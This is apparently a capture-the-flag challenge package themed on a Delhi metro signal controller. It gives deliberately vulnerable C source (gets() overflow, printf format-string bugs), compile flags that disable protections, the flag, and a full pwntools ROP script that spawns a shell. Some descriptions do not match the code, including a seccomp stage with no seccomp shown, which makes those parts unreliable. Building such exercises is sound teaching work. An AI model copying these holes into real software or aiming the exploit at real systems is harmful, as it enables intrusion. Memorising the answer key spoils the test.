# Binary Exploitation Challenge: System Override - The Grey Line Breach

## Challenge Metadata
| Field | Value |
|-------|-------|
| **Name** | System Override: Grey Line Signal Control |
| **Category** | Binary Exploitation (PWN) |
| **Difficulty** | MEDIUM (NIGHTMARE) |
| **Points** | 450 |
| **Flag** | `UG0x1{Gr3y_L1n3_0v3rfl0w_Pwn3d}` |

---

## Challenge Story

> **DMRC CRITICAL INFRASTRUCTURE ALERT**
>
> The Grey Line's SCADA signal controller has been exposed. A legacy C program 
> controls train signaling between Dwarka and Najafgarh.
>
> Your mission: Exploit memory vulnerabilities to gain shell access and 
> retrieve the classified SCADA credentials.
>
> This binary has multiple protection layers. You'll need to chain exploits.
>
> *— DMRC Infrastructure Security Team*

---

## VULNERABILITY CHAIN (4 Stages)

### Stage 1: Stack Buffer Overflow
- Classic `gets()` vulnerability in station name input
- Overflow allowed: 256 bytes, buffer: 64 bytes
- Canary: DISABLED
- NX: ENABLED (no shellcode, must ROP)

### Stage 2: Format String Vulnerability
- `printf(user_input)` in log function
- Leak stack addresses and libc base
- Bypass ASLR through info leak

### Stage 3: Return-Oriented Programming (ROP)
- Build ROP chain to call system("/bin/sh")
- Chain gadgets: pop rdi; ret → address of "/bin/sh" → system()
- Or: ret2libc attack

### Stage 4: Seccomp Bypass (Bonus Difficulty)
- Seccomp blocks execve
- Must use open/read/write to exfiltrate flag
- ORW (Open-Read-Write) chain required

---

## BINARY PROTECTIONS

| Protection | Status | Notes |
|------------|--------|-------|
| RELRO | Partial | GOT writable |
| Stack Canary | OFF | Allows overflow |
| NX | ON | No shellcode |
| PIE | OFF | Fixed base address |
| ASLR | ON (system) | Libc randomized |
| Seccomp | ON (hard mode) | Blocks execve |

---

## BINARY BEHAVIOR

```
$ ./signal_controller

╔══════════════════════════════════════════════════╗
║     DMRC GREY LINE SIGNAL CONTROLLER v2.3        ║
║     [SCADA Interface - Restricted Access]        ║
╚══════════════════════════════════════════════════╝

[1] View Signal Status
[2] Set Signal Override
[3] Log Station Message
[4] Admin Console
[5] Exit

Select option: 3

Enter station name: AAAAAAAAAAAAAAAA...
Enter message: %p.%p.%p.%p

[LOG] Station AAAA... Message: 0x7ffd...0x7f2...

Select option: 2

Enter signal code (32 chars max): AAAA...BBBB...CCCC...
Segmentation fault (core dumped)
```

---

## EXPLOIT FLOW

### Step 1: Leak Libc Address (Format String)
```
Option 3 → Station: "test" → Message: "%p.%p.%p.%p.%p.%p.%p.%p"
Output leaks stack addresses including libc pointer
```

### Step 2: Calculate Offsets
```python
libc_leak = 0x7f2a3b4c5d6e  # From format string
libc_base = libc_leak - offset_to_leak_point
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
```

### Step 3: Build ROP Chain
```python
from pwn import *

elf = ELF('./signal_controller')
libc = ELF('./libc.so.6')

# Gadgets
pop_rdi = 0x401234  # pop rdi; ret
ret = 0x401235       # ret (for stack alignment)

# Payload
payload = b'A' * 72  # Buffer + saved RBP
payload += p64(ret)  # Stack alignment
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

# Send via option 2
p.sendlineafter(b'Select option:', b'2')
p.sendlineafter(b'signal code:', payload)
p.interactive()
```

---

## SOURCE CODE (signal_controller.c)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char secret_flag[] = "UG0x1{Gr3y_L1n3_0v3rfl0w_Pwn3d}";

void win() {
    printf("FLAG: %s\n", secret_flag);
}

void view_status() {
    printf("\n[SIGNAL STATUS]\n");
    printf("Dwarka:    GREEN\n");
    printf("Nangli:    GREEN\n");
    printf("Najafgarh: GREEN\n");
}

void log_message() {
    char station[32];
    char message[64];
    
    printf("Enter station name: ");
    fgets(station, 32, stdin);
    station[strcspn(station, "\n")] = 0;
    
    printf("Enter message: ");
    fgets(message, 64, stdin);
    message[strcspn(message, "\n")] = 0;
    
    // FORMAT STRING VULNERABILITY
    printf("[LOG] Station ");
    printf(station);  // VULNERABLE!
    printf(" Message: ");
    printf(message);  // VULNERABLE!
    printf("\n");
}

void set_override() {
    char code[64];
    
    printf("Enter signal code (32 chars max): ");
    // BUFFER OVERFLOW VULNERABILITY
    gets(code);  // VULNERABLE! No bounds check
    
    printf("[*] Signal code received: %s\n", code);
}

void admin_console() {
    char password[32];
    int authenticated = 0;
    
    printf("Enter admin password: ");
    fgets(password, 32, stdin);
    
    // Fake check - can't actually login
    if (strcmp(password, "IMPOSSIBLE_PASSWORD_12345\n") == 0) {
        authenticated = 1;
    }
    
    if (authenticated) {
        printf("Admin access granted.\n");
        win();
    } else {
        printf("[!] Access denied.\n");
    }
}

void banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║     DMRC GREY LINE SIGNAL CONTROLLER v2.3        ║\n");
    printf("║     [SCADA Interface - Restricted Access]        ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");
    printf("\n");
}

int main() {
    int choice;
    
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    
    banner();
    
    while (1) {
        printf("[1] View Signal Status\n");
        printf("[2] Set Signal Override\n");
        printf("[3] Log Station Message\n");
        printf("[4] Admin Console\n");
        printf("[5] Exit\n\n");
        printf("Select option: ");
        
        if (scanf("%d", &choice) != 1) {
            while (getchar() != '\n');
            continue;
        }
        getchar();  // Consume newline
        
        switch (choice) {
            case 1: view_status(); break;
            case 2: set_override(); break;
            case 3: log_message(); break;
            case 4: admin_console(); break;
            case 5: 
                printf("Goodbye.\n");
                exit(0);
            default:
                printf("Invalid option.\n");
        }
        printf("\n");
    }
    
    return 0;
}
```

---

## COMPILATION

### Easy Mode (no ASLR on binary):
```bash
gcc -o signal_controller signal_controller.c -fno-stack-protector -no-pie -z execstack
```

### Medium Mode (NX enabled):
```bash
gcc -o signal_controller signal_controller.c -fno-stack-protector -no-pie
```

### Hard Mode (Full protections except canary):
```bash
gcc -o signal_controller signal_controller.c -fno-stack-protector -pie -z now
```

---

## SOLUTION SCRIPT

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./signal_controller')
context.log_level = 'info'

# Local or remote
# p = process('./signal_controller')
p = remote('challenge.example.com', 9001)

# Stage 1: Leak libc via format string
p.sendlineafter(b'option:', b'3')
p.sendlineafter(b'name:', b'%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%13$p')
p.sendlineafter(b'message:', b'X')

# Parse leak
p.recvuntil(b'Station ')
leaks = p.recvuntil(b' Message:').decode().split('.')
libc_leak = int(leaks[-1].replace(' Message:', ''), 16)
log.info(f'Libc leak: {hex(libc_leak)}')

# Calculate libc base (offset depends on libc version)
libc = ELF('./libc.so.6')
libc_base = libc_leak - 0x1ed723  # Adjust for your libc
libc.address = libc_base
log.info(f'Libc base: {hex(libc_base)}')

# Stage 2: Build ROP chain
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
pop_rdi = libc_base + 0x23b6a  # pop rdi; ret in libc
ret = libc_base + 0x22679      # ret gadget

log.info(f'system: {hex(system)}')
log.info(f'/bin/sh: {hex(binsh)}')

# Stage 3: Exploit buffer overflow
payload = b'A' * 72  # 64 buffer + 8 saved RBP
payload += p64(ret)   # Stack alignment for movaps
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'option:', b'2')
p.sendlineafter(b'code:', payload)

# Shell!
p.interactive()
```

---

## ADMIN PANEL ENTRY

| Field | Value |
|-------|-------|
| **Title** | System Override: Grey Line Signal Control |
| **Category** | Binary Exploitation (PWN) |
| **Difficulty** | MEDIUM |
| **Points** | 450 |
| **Flag** | `UG0x1{Gr3y_L1n3_0v3rfl0w_Pwn3d}` |

### Description:
```
The Grey Line's SCADA signal controller has a legacy vulnerability.

Exploit the binary to gain shell access on the signal control system.

This is real binary exploitation. Buffer overflows. ROP chains. No mercy.

nc challenge.underground-0x1.com 9001
```

---

## FILES TO PROVIDE
1. `signal_controller` - The vulnerable binary
2. `libc.so.6` - The libc version used (for offset calculation)
3. `ld-linux-x86-64.so.2` - Dynamic linker (optional)
